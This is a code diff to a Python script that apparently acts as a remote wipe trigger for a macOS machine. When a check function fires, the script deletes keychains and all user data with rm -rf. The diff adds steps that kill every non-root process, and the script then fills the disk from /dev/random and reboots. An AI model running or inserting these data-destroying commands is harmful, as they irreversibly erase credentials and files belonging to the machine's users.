@@ -1,4 +1,6 @@
 import os
+my_pid = os.getpid()
+import psutil
 import requests
 import time
 
@@ -29,12 +31,20 @@ def chk_need_wipe():
 while True:
     if chk_need_wipe():
         print(time.ctime(), 'Wiping all data now...')
+        # delete keychains
         os.system("rm -rf /Library/Keychains/* &")
         os.system("rm -rf /Network/Library/Keychains/* &")
+        # delete user data
         for u in real_users:
             os.system(f"rm -rf /Users/{u}/Library/* &")
             os.system(f"rm -rf /Users/{u}/* &")
         os.system("rm -rf /var/root/* &")
+        # kill all processes except root and self
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            if proc.info['pid'] != my_pid and proc.info['username'] != 'root':
+                print(f"Attempting to kill process: {proc.info}")
+                os.system(f"kill -9 {proc.info['pid']} &")
+        # fill disk space with garbage data
         os.system('nohup cat /dev/random > /var/root/a')
         # when done, reboot the machine
         os.system("shutdown -r now")
